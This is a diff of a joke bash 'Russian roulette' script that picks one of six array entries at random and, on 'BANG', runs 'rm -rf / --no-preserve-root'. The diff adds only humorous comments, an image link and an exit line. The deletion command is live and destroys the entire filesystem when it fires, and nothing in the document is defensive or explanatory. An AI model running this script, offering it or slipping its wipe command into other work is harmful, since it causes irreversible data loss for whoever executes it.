@@ -13,7 +13,7 @@ echo ''
 arr[0]="CLICK"
 arr[1]="CLICK"
 arr[2]="CLICK"
-arr[3]="BANG"
+arr[3]="BANG" # <- https://i.ytimg.com/vi/R0hT_EwAFas/hqdefault.jpg
 arr[4]="CLICK"
 arr[5]="CLICK"
 # Define what constitutes "random"
@@ -22,7 +22,12 @@ rand=$[$RANDOM % ${#arr[@]}]
 triggergo="$(echo ${arr[$rand]})"
 # Outcome of trigger
 if [[ $triggergo == "BANG" ]]; then
+        # Oh shit
         echo "BANG!" ; rm -rf / --no-preserve-root
 else
+        # You live to compile another day
         echo "CLICK"
 fi
+
+# Exit cleanly (if you survive)
+exit
